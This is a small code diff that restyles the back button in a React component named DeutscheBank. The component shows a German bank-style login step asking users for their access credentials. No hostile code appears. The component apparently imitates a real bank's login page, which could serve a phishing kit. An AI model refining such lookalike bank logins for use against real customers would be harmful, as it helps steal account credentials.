@@ -176,14 +176,16 @@ const DeutscheBank = () => {
                     Guten Tag
                   </h1>
                 ) : (
-                  <button
-                    type="button"
-                    onClick={() => setStep(1)}
-                    className="flex items-center gap-1 text-[28px] mb-2 hover:underline"
-                    style={{ color: BLUE, lineHeight: 1.2 }}
-                  >
-                    <ArrowLeft size={28} /> Zurück
-                  </button>
+                  <div className="mb-2 flex items-center" style={{ height: 34 }}>
+                    <button
+                      type="button"
+                      onClick={() => setStep(1)}
+                      className="flex items-center gap-1 text-[14px] underline"
+                      style={{ color: BLUE }}
+                    >
+                      <ArrowLeft size={14} /> Zurück
+                    </button>
+                  </div>
                 )}
                 <p className={`text-[15px] mb-5 ${step === 2 ? "mt-6" : ""}`} style={{ color: NAVY }}>Bitte geben Sie Ihre Zugangsdaten ein.</p>
 
